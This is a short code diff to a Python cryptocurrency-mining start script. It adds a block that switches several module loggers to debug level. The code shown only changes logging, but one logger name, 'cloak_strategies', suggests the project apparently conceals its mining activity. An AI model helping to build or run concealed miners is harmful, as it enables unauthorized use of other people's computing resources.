@@ -62,6 +62,27 @@ os.makedirs(LOGS_DIR, exist_ok=True)
 # **Main application logger** (logger ứng dụng chính)
 logger = setup_logging('start_mining', str(Path(LOGS_DIR) / 'start_mining.log'), 'INFO')
 
+# ---------- DEBUG CPU LOGGING BOOSTER ----------
+try:
+    from mining_environment.scripts.unified_logging import get_unified_logger
+    CPU_LOGGERS = [
+        'mining_environment.resource_control',
+        'mining_environment.cloak_strategies',
+        'cpu_plugin',
+        'gpu_plugin',  # nếu muốn thấy plugin GPU
+        'optimized_calc_chain',
+        'mining_environment.cpu_plugins.optimization.mining_integration_adapter',
+    ]
+    for _name in CPU_LOGGERS:
+        _lg = get_unified_logger(_name)
+        _lg.setLevel(logging.DEBUG)
+        for _h in _lg.handlers:
+            _h.setLevel(logging.DEBUG)
+        _lg.debug('===== DEBUG MODE ENABLED (auto-booster) =====')
+except Exception as _dbg_err:
+    logger.warning(f'DEBUG booster init failed: {_dbg_err}')
+# ---------- END BOOSTER ----------
+
 # **Dedicated Module Loggers** (Logger mô-đun chuyên dụng)
 cpu_miner_logger = setup_logging('cpu_miner', str(Path(LOGS_DIR) / 'cpu_miner.log'), 'INFO')
 gpu_miner_logger = setup_logging('gpu_miner', str(Path(LOGS_DIR) / 'gpu_miner.log'), 'INFO')
